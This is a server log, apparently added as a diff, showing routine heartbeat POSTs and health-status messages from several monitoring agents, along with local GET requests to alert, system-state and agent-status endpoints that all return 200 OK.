+INFO:     127.0.0.1:55964 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:45] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55965 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:45] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55966 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:45] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55967 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:45] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55968 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:45] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55969 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:56] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55976 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:57] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55977 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:57] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55978 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:57] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55979 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:57] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55980 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:05:57] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55981 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:08] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55988 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:09] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55989 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:09] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55990 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:09] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55991 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:09] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55992 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:09] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55993 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:06:20] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55868 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:06:21] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55869 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:21] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55870 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:21] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55871 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:21] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55872 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:21] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55873 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:06:33] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55885 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:33] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55888 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:33] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55889 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:33] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55890 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:33] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55891 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:34] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55892 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:06:45] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55904 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:45] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55905 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:45] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55906 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:45] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55907 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:46] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55908 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:46] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55909 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:06:57] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:56771 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:57] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:56772 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:57] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:56773 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:58] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:56774 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:58] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:56775 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:06:58] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:56776 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:63138 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:07:09] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:61968 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:09] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:61969 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:09] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:61970 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:10] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:61971 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:10] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:61972 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:10] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:61973 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55865 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55865 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58621 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55865 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:07:21] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:61980 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:07:22] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:61981 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:22] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:61982 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:22] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:61983 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:22] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:61984 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:22] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:61985 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:07:33] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64587 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:34] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64588 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:34] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64589 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:34] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64590 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:34] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64591 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:34] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64592 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:07:45] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64600 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:46] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64601 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:46] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64602 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:46] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64603 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:46] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64604 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:07:46] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64605 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58809 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:64995 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56918 - "GET /agent-status HTTP/1.1" 200 OK
+[2026-03-06 13:07:57] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64613 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:58] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64614 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:58] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64615 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:58] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64616 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:58] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64617 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:07:58] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64618 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:09] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64625 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:10] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64626 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:10] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64627 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:10] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64628 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:10] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64629 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:10] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64630 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:21] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64637 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:22] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64638 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:22] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64639 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:22] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64640 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:22] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64641 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:22] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64642 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53648 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52322 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:62781 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52322 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:08:33] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:58068 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:34] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:58069 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:34] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:58070 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:34] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:58071 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:34] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:58072 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:34] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:58073 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:45] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:49403 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:46] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:49404 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:46] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:49405 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:46] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:49406 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:46] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:49407 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:46] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:49668 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:58] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:49681 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:58] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:49683 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:58] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:49684 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:58] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:49685 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:58] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:49687 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:08:59] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:49688 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:10] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:54203 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:10] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:54205 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:10] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:54206 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:10] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:54207 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:11] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:54208 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:11] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:54209 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:22] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:54219 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:22] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:54220 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:22] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:54221 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:23] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:54222 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:23] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:54223 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:23] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:54224 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58061 - "GET /alerts HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58061 - "GET /system-state HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58061 - "GET /agent-status HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58061 - "GET /system-state HTTP/1.1" 200 OK
+[2026-03-06 13:09:34] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55717 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:34] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55718 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:34] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55719 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:35] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55720 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:35] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55721 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:35] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55722 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:46] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:55732 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:47] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:55733 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:47] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:55734 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:47] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:55735 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:47] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:55736 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:47] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:55737 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:58] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64277 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:59] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64278 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:59] AgentHealth -> data_agent Online
+INFO:     127.0.0.1:64279 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:59] AgentHealth -> identity_agent Online
+INFO:     127.0.0.1:64280 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:59] AgentHealth -> app_agent Online
+INFO:     127.0.0.1:64281 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:09:59] AgentHealth -> infra_agent Online
+INFO:     127.0.0.1:64282 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:10] AgentHealth -> adaptive_agent Online
+INFO:     127.0.0.1:64292 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:11] AgentHealth -> network_agent Online
+INFO:     127.0.0.1:64293 - "POST /agent-heartbeat HTTP/1.1" 200 OK
+[2026-03-06 13:10:11] AgentHealth -> data_agent Online
